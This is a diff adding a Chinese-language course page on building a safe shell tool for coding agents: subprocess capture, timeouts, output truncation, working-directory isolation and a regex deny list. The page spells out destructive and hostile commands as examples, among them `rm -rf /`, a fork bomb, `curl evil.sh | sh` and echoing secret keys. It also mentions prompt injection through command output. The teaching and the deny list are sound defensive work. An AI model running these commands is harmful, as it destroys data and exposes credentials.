@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>02 · Shell 工具</title>
+<link rel="stylesheet" href="../assets/style.css">
+<script>
+  window.MathJax = { tex: { inlineMath: [['$','$'],['\\(','\\)']], displayMath: [['$$','$$'],['\\[','\\]']] } };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script>
+</head>
+<body>
+
+<div class="topbar"><div class="inner">
+  <a class="home" href="../index.html">⌂ 课程主页</a>
+  <a href="../glossary.md">术语词典</a>
+  <a href="../references.md">论文清单</a>
+  <span class="spacer"></span>
+  <span style="color:var(--fg-dim)">MODULE 02 / 06</span>
+</div></div>
+
+<div class="wrap">
+
+  <h1>02 · Shell 工具</h1>
+  <p class="subtitle">agent 的脚 —— 用 subprocess 安全执行命令：捕获返回码/stdout/stderr 三件套、超时防挂死、输出截断防爆窗口、cwd 隔离锁工作区、危险命令拦截防灾难；让 agent 能跑测试、跑构建、自我验证</p>
+
+  <div class="meta-box">
+    <div class="item"><div class="k">前置知识</div><div class="v">模块 00–01、Python subprocess 略知、一点 shell 常识、安全意识</div></div>
+    <div class="item"><div class="k">配套 notebook</div><div class="v"><span class="badge cpu">CPU</span> 02_shell_tool.ipynb</div></div>
+    <div class="item"><div class="k">核心论文</div><div class="v">SWE-agent (ACI)、OWASP Command Injection、Anthropic Building effective agents、subprocess 文档</div></div>
+    <div class="item"><div class="k">预计时长</div><div class="v">读 55 分钟 + 跑 45 分钟</div></div>
+  </div>
+
+  <div class="toc">
+    <h3>本章地图</h3>
+    <ol>
+      <li><a href="#feet">Shell 工具：agent 的脚</a></li>
+      <li><a href="#subprocess">subprocess 基础：捕获三件套</a></li>
+      <li><a href="#timeout">超时：防命令挂死会话</a></li>
+      <li><a href="#truncate">输出截断：别烧光上下文</a></li>
+      <li><a href="#cwd">工作目录隔离</a></li>
+      <li><a href="#danger">危险命令防护</a></li>
+      <li><a href="#assemble">拼成 agent 的脚</a></li>
+      <li><a href="#frontier">研究前沿与开放问题</a></li>
+    </ol>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="feet"><span class="num">1</span>Shell 工具：agent 的脚</h2>
+  <p>模块 01 给了 agent 一双手（读写文件）。但光有手还不够——agent 怎么知道自己改对了？怎么跑测试、跑构建、查看仓库状态、安装依赖？这些都要靠<strong>执行命令</strong>的能力。如果文件工具是手，那么<strong>Shell 工具就是 agent 的脚</strong>：它让 agent 能在真实环境里<em>动起来</em>，把意图变成对系统的实际操作。</p>  <p>Shell 工具的核心其实只有一行：用 Python 标准库的 <code>subprocess.run</code> 启动一个外部命令、等它结束、拿回它的输出。但「把这一行做对、做安全」却是本模块的全部重量所在。一个不设防的 shell 工具是编码 agent 里<strong>最危险的部件</strong>——它能让 LLM（无论出于错误还是被诱导）执行任意命令：删文件、读密钥、把整台机器搞瘫。所以本模块的主线不是「怎么跑命令」，而是<strong>怎么安全地跑命令</strong>：超时、输出捕获与截断、工作目录隔离、危险命令防护——这四道闸门，缺一不可。</p>  <p>还有一层对 LLM 友好的考量。命令跑完，agent 需要从结果里读出三样东西：<strong>成没成</strong>（返回码）、<strong>正常输出</strong>（stdout）、<strong>错误信息</strong>（stderr）。把这三样<em>结构化</em>地交给 LLM，它才能判断下一步——返回码非 0 说明失败、stderr 里的 traceback 指向出错位置、stdout 里的测试摘要说明还剩几个用例没过。Shell 工具的输出设计，直接决定了模块 04「解析测试结果、决定下一步改哪」做起来顺不顺。</p>  <div class="callout intuition"><span class="label"></span>
+    <p>一句话抓住本模块：<strong>能跑命令的 agent 是把双刃剑——锋利（能跑测试、能自动化一切）也危险（能毁掉一切）。本模块就是给这把剑装上四道保险：超时（防卡死）、截断（防撑爆窗口）、cwd 隔离（防乱跑）、危险命令拦截（防灾难）</strong>。把安全做进工具本身，而不是事后补。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="subprocess"><span class="num">2</span>subprocess 基础：捕获三件套</h2>
+  <h3>subprocess 基础：启动命令、捕获三件套</h3>  <p>先看最朴素的实现。<code>subprocess.run</code> 启动一个命令、阻塞到它结束，返回一个含返回码与输出的结果对象。给 agent 用，关键是这几个参数：</p>  <table>
+    <thead><tr><th>参数</th><th>作用</th><th>为什么 agent 必须用它</th></tr></thead>
+    <tbody>
+      <tr><td><code>capture_output=True</code></td><td>捕获 stdout / stderr 到结果对象</td><td>agent 要读输出来判断结果，不能让它直接打到终端</td></tr>
+      <tr><td><code>text=True</code></td><td>输出按文本（str）而非字节返回</td><td>省去手动 decode，直接喂给 LLM</td></tr>
+      <tr><td><code>cwd=workspace</code></td><td>在指定工作目录里执行</td><td>把命令锁在工作区，相对路径不乱跑（见第 5 节）</td></tr>
+      <tr><td><code>timeout=N</code></td><td>最长跑 N 秒，超时抛异常</td><td>防死循环/卡住的命令挂死会话（见第 3 节）</td></tr>
+      <tr><td><code>shell=False</code></td><td>命令以参数列表传入、不经 shell 解析</td><td>避免 shell 注入（见第 6 节）</td></tr>
+    </tbody>
+  </table>  <pre><code>import subprocess
+def run_command(work, argv, timeout=30):
+    '''argv 是参数列表，如 ['python', '-m', 'pytest', '-q']。'''
+    r = subprocess.run(argv, cwd=work, capture_output=True,
+                       text=True, timeout=timeout)
+    return {'returncode': r.returncode,
+            'stdout': r.stdout,
+            'stderr': r.stderr}</code></pre>  <p>返回码（<span class="term">return code</span>）是 agent 最该先看的信号：约定 <code>0</code> 表示成功、非 0 表示失败。它是<strong>结构化、无需解析</strong>的——agent 不必读懂满屏文本，先看一眼返回码就知道命令成没成，这是一种廉价而可靠的判断。stdout 与 stderr 则要<strong>分开捕获</strong>：约定俗成地，程序的正常结果走 stdout，诊断与错误走 stderr。pytest 的失败摘要主要在 stdout，而一个崩溃的 Python 脚本的 traceback 在 stderr——agent 要两路都看，才能拼出完整图景。</p>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>把 subprocess 想成 agent 派出去办事的信使：你给它一句命令（argv），它去执行，回来时带三样东西——办成了没（返回码）、它看到的正常情况（stdout）、它遇到的麻烦（stderr）。agent 据这三样决定下一步。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式上，每次命令执行是一个有副作用的子进程调用，其<strong>可观测结果</strong>被规约成 <code>(returncode, stdout, stderr)</code> 三元组。这个三元组就是 agent 在「行动」之后获得的「观察」（回到模块 00 的观察-行动循环）。三元组的设计——一个布尔式的成败信号 + 两路文本——既覆盖了快速判断，又保留了细节诊断，是给 LLM 的理想观察格式。</p></div>
+  </div>  <p>这里还藏着一个<strong>对解析极其重要</strong>的小动作，你会在 notebook 里看到它救了场：很多命令行工具（包括 pytest）会<strong>自动给输出加 ANSI 颜色码</strong>（让终端里红的红、绿的绿）。可这些颜色码（形如 <code>\x1b[31m</code>）混进文本后，会让后面（模块 04）想用正则去抓「<code>FAILED test_x</code>」「<code>file:line:</code>」的尝试<strong>全部落空</strong>——因为行首被一串不可见的转义序列占了。所以给 agent 跑这类工具时，要么显式<strong>关闭颜色</strong>（pytest 用 <code>--color=no</code>、或设环境变量 <code>PY_COLORS=0</code>），要么在解析前用正则把 ANSI 码剥掉。这是个不起眼却真实会咬人的坑，记住它：<strong>给 LLM/程序消费的输出，一律要纯净、无装饰</strong>。</p>  <div class="callout warn"><span class="label"></span>
+    <p>一个新手陷阱：用 <code>os.system()</code> 或 <code>subprocess.run(cmd, shell=True)</code> 拼字符串跑命令。前者拿不到结构化输出，后者把命令交给 shell 解析、埋下注入风险（第 6 节）。给 agent 用，优先 <strong>参数列表 + shell=False</strong>：既能精确捕获三件套，又从根上避免了 shell 把特殊字符当语法解释。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="timeout"><span class="num">3</span>超时：防命令挂死会话</h2>
+  <h3>超时：防止一条命令挂死整个会话</h3>  <p>第一道保险：<strong>超时</strong>。agent 跑的命令是 LLM 生成的，谁也不能保证它不会触发一个<strong>死循环</strong>（<code>while True</code> 的测试）、一个<strong>卡在等待输入</strong>的命令（<code>python</code> 进了交互模式等你敲东西）、或一个<strong>跑到天荒地老</strong>的构建。没有超时，这些会把整个 agent 会话<em>永久挂起</em>——比报错更糟，因为它连错都不报，就是干等。</p>  <p>解法是 <code>subprocess.run(..., timeout=N)</code>：超过 N 秒，subprocess 会杀掉子进程并抛 <code>TimeoutExpired</code>。agent 工具要<strong>捕获这个异常</strong>、把它转成一条对 LLM 友好的结果（「命令超时（>30s），已终止」），而非让异常冒泡崩掉整个循环。超时不是错误，而是一个<strong>正常的、预期内的</strong>结果——agent 据它知道「这条路走不通，换个法子」。</p>  <pre><code>def run_command(work, argv, timeout=30):
+    try:
+        r = subprocess.run(argv, cwd=work, capture_output=True,
+                           text=True, timeout=timeout)
+        return {'returncode': r.returncode, 'stdout': r.stdout,
+                'stderr': r.stderr, 'timed_out': False}
+    except subprocess.TimeoutExpired as e:
+        # 超时也要返回结构化结果（含已产生的部分输出），而非崩溃
+        return {'returncode': -1, 'stdout': e.stdout or '', 'stderr': e.stderr or '',
+                'timed_out': True, 'message': f'命令超时(&gt;{timeout}s)，已终止'}</code></pre>  <p>超时时长的选择是个权衡：太短会误杀本来就需要跑久的合理命令（大型测试套件、编译），太长则在卡死时让 agent 干等太久。实践中常按命令类型分级——快查（<code>ls</code>、<code>grep</code>）给几秒、跑测试给几十秒到几分钟、且让上层可配置。更稳妥的还会用<strong>进程组</strong>来终止：子进程可能又派生了孙进程，只杀直接子进程会留下孤儿；用 <code>start_new_session=True</code> 起一个进程组、超时时杀掉整组，才能斩草除根。本课用最简版（依赖 subprocess 自带的终止），但你要知道生产里这一步要做得更彻底。</p>  <div class="callout danger"><span class="label"></span>
+    <p>超时是 agent 安全的<strong>基本人权</strong>，不是可选项。一个没有超时的 shell 工具，迟早会被某个 LLM 生成的死循环或交互式命令挂死，且毫无征兆。把超时设成工具的<strong>默认必填参数</strong>（而非可选、可省略），从接口层面强制每次调用都带它。记住：你永远无法预测 LLM 会生成什么命令，所以必须假设最坏情况。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="truncate"><span class="num">4</span>输出截断：别烧光上下文</h2>
+  <h3>输出截断：别让一条命令烧光上下文窗口</h3>  <p>第二道保险：<strong>输出截断</strong>。一条命令可能吐出<strong>几万行</strong>输出——<code>pip install</code> 的进度、一个失败测试的海量日志、<code>find /</code> 的满屏路径。如果把这些原样回填进对话，会瞬间<strong>撑爆 LLM 的上下文窗口</strong>、烧掉大量 token（钱），还把真正有用的信息淹没在噪音里。所以 shell 工具必须<strong>限制输出长度</strong>。</p>  <p>好的截断策略不是简单砍掉尾巴，而是<strong>保留头尾、省略中间</strong>。原因是：一段输出最有价值的信息往往在<em>开头</em>（命令在干什么、初始报错）和<em>结尾</em>（最终结果、测试摘要、退出信息），中间大量重复的进度/日志价值最低。于是常见做法是：保留前 N 行 + 后 M 行，中间用一行 <code>... (省略 K 行) ...</code> 标记。这样既控住了长度，又让 LLM 看到最关键的两端。</p>  <pre><code>def truncate(text, head=40, tail=20):
+    '''保留前 head 行 + 后 tail 行，中间省略并标注省了多少。'''
+    lines = text.splitlines()
+    if len(lines) &lt;= head + tail:
+        return text
+    omitted = len(lines) - head - tail
+    kept = lines[:head] + [f'... (省略 {omitted} 行) ...'] + lines[-tail:]
+    return '\n'.join(kept)</code></pre>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>截断就像给 agent 看一份长报告的「摘要版」：开头的背景 + 结尾的结论保留，中间的冗长细节折叠起来。LLM 通常靠这两端就能判断发生了什么；真要看中间，它可以再发一条更精确的命令（如只跑那一个失败的测试）。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式上，截断是在<strong>信息量 vs token 成本</strong>间做的有损压缩，且利用了输出的<strong>信息分布先验</strong>（两端密度高、中间冗余）。它和模块 01 的「按范围读」、prompt caching 是同一类工程——全都是在与上下文窗口这个硬约束搏斗。值得强调的是：截断的边界值（head/tail）本身是可调的 ACI 旋钮，调太狠会丢关键信息，调太松会浪费窗口。</p></div>
+  </div>  <div class="callout intuition"><span class="label"></span>
+    <p>截断不只省钱，还<strong>提质</strong>：把一个失败测试的 5000 行日志压成「头 40 + 尾 20」行，LLM 反而<em>更容易</em>抓住关键报错——信噪比提高了。这呼应模块 00 的洞察：agent 的能力上限是它「感官」的质量，而过载的、噪音淹没信号的输入，是劣质感官。少即是多。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="cwd"><span class="num">5</span>工作目录隔离</h2>
+  <h3>工作目录隔离：把命令锁在工作区里</h3>  <p>第三道保险：<strong>工作目录隔离</strong>，和模块 01 的路径安全一脉相承。命令里满是相对路径（<code>pytest tests/</code>、<code>cat config.py</code>），这些相对路径相对<em>哪里</em>解析，取决于命令的<strong>当前工作目录</strong>（cwd）。如果不指定，子进程会继承 Python 进程的 cwd——那可能是你的家目录、项目根、谁知道哪里，命令就会在<strong>意料之外的地方</strong>读写。</p>  <p>解法很直接：<code>subprocess.run(..., cwd=workspace)</code> 把每条命令的工作目录<strong>钉死在工作区</strong>。这样 <code>pytest</code> 跑的是工作区里的测试、<code>cat x.py</code> 读的是工作区里的文件，相对路径再也不会乱跑。配合模块 01 的临时目录沙箱，agent 的整个文件视野就被框在一个可控、可清理的盒子里。</p>  <p>但要清醒：<code>cwd</code> 只约束了<em>相对路径的起点</em>，它<strong>挡不住绝对路径</strong>——命令里写 <code>rm /etc/passwd</code> 照样会去动系统文件，因为绝对路径不经 cwd 解析。所以 cwd 隔离是<strong>纵深防御的一层</strong>，不是全部：它管住了「不小心在错地方操作」，但管不住「故意用绝对路径越界」——后者要靠下一节的危险命令防护、以及终极的容器/沙箱隔离。本课用临时目录 + cwd + 危险命令拦截这几层叠加，已能挡住绝大多数事故。</p>  <div class="callout warn"><span class="label"></span>
+    <p>环境变量也是隔离的一部分。子进程默认继承父进程的全部环境变量——包括你的 <code>ANTHROPIC_API_KEY</code>、AWS 密钥等。一个会跑命令的 agent，理论上能 <code>echo $SECRET_KEY</code> 把它们打出来、甚至外传。生产 agent 会用 <code>env=</code> 显式传一份<strong>清洗过的最小环境</strong>给子进程，而非裸继承。本课不深入，但你要知道：<strong>隔离不只是文件系统，还包括环境变量、网络</strong>——能跑命令的 agent，每一条对外通道都要审视。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="danger"><span class="num">6</span>危险命令防护</h2>
+  <h3>危险命令防护：拦住灾难性操作</h3>  <p>第四道、也是最关乎生死的一道保险：<strong>危险命令防护</strong>。即便有了 cwd 隔离，一个 LLM 生成的（或被 prompt injection 诱导的）命令仍可能是灾难性的：<code>rm -rf /</code>（删根）、<code>rm -rf ~</code>（删家目录）、<code>:(){ :|:&amp; };:</code>（fork 炸弹）、<code>curl evil.sh | sh</code>（下载执行任意脚本）、<code>sudo ...</code>（提权）。这些一旦执行，后果不可逆。</p>  <p>防护有两种思路。<strong>黑名单（deny list）</strong>：维护一组危险模式，命令命中就拒绝。简单、覆盖常见灾难，但<strong>挡不住没想到的变体</strong>（攻击者总能绕，如 <code>rm -fr /</code>、加空格、变量拼接）。<strong>白名单（allow list）</strong>：只放行一组明确安全的命令（<code>ls</code>、<code>cat</code>、<code>python -m pytest</code>……），其余一律拒。更安全，但更死板——agent 想用一个没预料到的合理命令也会被挡。</p>  <pre><code>DANGER_PATTERNS = [
+    r'\brm\s+-[rf]',          # rm -rf / rm -fr / rm -r / rm -f
+    r'\bsudo\b', r'\bmkfs\b', r'&gt;\s*/dev/sd',   # 提权 / 格式化 / 写裸盘
+    r':\(\)\s*\{',           # fork 炸弹 :(){ ...
+    r'\bcurl\b.*\|\s*(sh|bash)', r'\bwget\b.*\|\s*(sh|bash)',  # 下载执行
+]
+import re
+def is_dangerous(command_str):
+    return any(re.search(pat, command_str) for pat in DANGER_PATTERNS)
+
+def guarded_run(work, command_str, timeout=30):
+    if is_dangerous(command_str):
+        return {'returncode': -1, 'blocked': True,
+                'message': f'命令被安全策略拒绝：{command_str!r}'}
+    # 安全则执行（注意：演示用 shell 解析命令串；生产更推荐参数列表）
+    return run_command(work, command_str, timeout=timeout)</code></pre>  <div class="dual">
+    <div class="plain"><h4>直白说</h4>  <p>黑名单像机场的违禁品清单（已知危险物拦下），白名单像「只准带这几样东西登机」。前者方便但总有漏网之鱼，后者安全但限制多。现实中常两者结合，再加上一道终极保险——把整个 agent 关在容器里跑，即便命令越界也困在容器内、毁不到宿主。</p></div>
+    <div class="formal"><h4>严谨说</h4>  <p>形式上，这是在<strong>安全性 vs 能力</strong>之间取舍：白名单偏安全（默认拒绝、显式放行），黑名单偏能力（默认允许、显式拦截）。安全工程的共识是<strong>默认拒绝（fail-safe / deny by default）</strong>更稳健——但对一个要解决开放任务的编码 agent，过严的白名单会废掉它大半能力。所以业界实践是：黑名单拦明确灾难 + 容器/沙箱兜底 + 破坏性操作人在回路确认，多层叠加，而非指望单层完美。</p></div>
+  </div>  <div class="callout danger"><span class="label"></span>
+    <p>务必清醒：<strong>没有任何单一防护是完美的</strong>。黑名单能被绕过、白名单会误伤、正则总有边界情况。本节的拦截是<strong>一层必要但不充分</strong>的防御——它的价值在于挡住绝大多数低级灾难和无心之失。真正的安全来自<strong>纵深</strong>：危险命令拦截 + cwd/路径隔离 + 临时目录 + 容器沙箱 + 最小权限 + 人在回路。本课教你装好前几层；上生产时，容器隔离和人工确认是不能省的最后两道。<strong>永远假设 agent 会执行最坏的命令，然后让环境扛得住</strong>。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="assemble"><span class="num">7</span>拼成 agent 的脚</h2>
+  <h3>把 Shell 工具拼成 agent 的「脚」</h3>  <p>把四道保险叠起来，agent 就有了一双安全的脚。一次典型的「跑测试看结果」会这样走：</p>  <ol>
+    <li><strong>防护</strong>：命令先过 <code>is_dangerous</code>，灾难性命令直接拒；</li>
+    <li><strong>隔离</strong>：在 <code>cwd=workspace</code> 里执行，相对路径锁在工作区；</li>
+    <li><strong>限时</strong>：带 <code>timeout</code>，死循环/卡住会被终止并返回结构化超时；</li>
+    <li><strong>截断</strong>：stdout/stderr 经 <code>truncate</code> 压到合理长度再回填；</li>
+    <li><strong>结构化返回</strong>：把 <code>(returncode, stdout, stderr, timed_out, blocked)</code> 交给 LLM 当观察。</li>
+  </ol>  <p>这个工具是模块 04（edit-test-fix 循环）的引擎之一：agent 改完代码，调它跑 <code>python -m pytest</code>，从返回码知道成没成、从（截断后的）输出知道哪些用例失败——再决定下一步。可以说，<strong>文件工具让 agent 能改，shell 工具让 agent 能验</strong>；改与验合起来，才有了「自我纠错」的可能。没有「验」，agent 只能盲改，永远不知道自己对没对。</p>  <p>值得点明这双「脚」与前两个模块的<strong>协同</strong>关系。shell 工具几乎从不孤立使用：它跑的命令里的相对路径，靠的是模块 01 同源的工作区约束；它 <code>cat</code>/查看文件的能力，与模块 01 的读文件互补（小文件用 read、跑命令产出的大输出用 shell+截断）；它最重要的搭档则是模块 04 的循环——循环每一轮的「跑测试」就是一次 shell 调用，循环据其返回码判收敛、据其输出（解析后）定位下一步。把这条链看清：<em>搜索定位 → 文件读改 → shell 验证 → 循环迭代</em>，shell 工具是其中<strong>把「改动」与「现实反馈」连起来</strong>的那一环。少了它，agent 改完代码就两眼一抹黑；有了它，每次改动都能立刻得到客观裁决。</p>  <p>回到 ACI 的视角：shell 工具的每个安全设计，同时也是一个<strong>对 LLM 友好</strong>的设计。超时返回「命令超时」比无声挂起，让 LLM 知道该换路；截断后的精简输出比海量日志，让 LLM 抓得住重点；拦截危险命令时返回「被拒绝，因为 X」，让 LLM 明白边界、换个安全的做法。<strong>安全与友好在这里是同一件事的两面</strong>：一个会给出清晰、有界、可操作反馈的工具，既保护了系统，也帮助了模型。这正是把工具<em>当作给 LLM 的接口</em>来设计的精髓。</p>  <div class="callout paper"><span class="label"></span>
+    <p>现实参照：SWE-agent 的 shell 工具同样强调超时、输出限长与对 LLM 友好的反馈格式（ACI 的核心案例）；Claude Code 在执行命令前会对潜在危险操作征求确认（人在回路）。把本模块的四道保险理解透，你就理解了这些 agent「脚」的安全内核。清单见 <code>references.md</code>。</p>
+  </div>
+
+  <!-- ========================================================= -->
+  <h2 id="frontier"><span class="num">8</span>研究前沿与开放问题</h2>
+  <h3>研究前沿与开放问题</h3>  <ul>
+    <li><strong>沙箱与隔离的强度</strong>：从 cwd 隔离到容器（Docker）、到微虚拟机（gVisor、Firecracker），隔离越强越安全但越重。怎么在「让 agent 真能跑命令」与「即便它跑了坏命令也毁不了东西」间取平衡，是 agent 基础设施的核心课题。</li>
+    <li><strong>prompt injection 经由命令输出</strong>：agent 跑命令读到的输出里可能藏有恶意指令（如一个被污染的文件、一个返回恶意文本的 API），劫持 agent 去执行危险操作。如何不盲信工具输出，是 agent 安全的开放难题。</li>
+    <li><strong>交互式与长跑命令</strong>：很多真实命令需要交互（输入密码、确认 y/n）或长期运行（dev server）。如何让 agent 处理这类不符合「跑完即返回」模型的命令（伪终端 pty、后台进程管理），仍是工程难点。</li>
+    <li><strong>最小权限与能力声明</strong>：理想情况下，agent 跑某条命令前应声明它需要什么权限（读哪些文件、是否联网），由系统按最小权限授予。把这套「能力安全」机制做进 agent，是比黑/白名单更根本的方向。</li>
+  </ul>  <div class="callout paper"><span class="label"></span>
+    <p>必读：SWE-agent 论文（ACI 与 shell 工具设计）、OWASP 的 Command Injection 条目（注入成因与防御）、Anthropic《Building effective agents》（agent 安全与最小脚手架）。Python <code>subprocess</code> 官方文档是本模块的标准库依据。清单见 <code>references.md</code>。</p>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="../01_file_tools/01_讲解.html"><div class="dir">← 上一模块</div><div class="t">01 · 文件工具</div></a>
+    <a class="next" href="../03_code_search/03_讲解.html"><div class="dir">下一模块 →</div><div class="t">03 · 代码导航</div></a>
+  </div>
+
+</div>
+</body>
+</html>
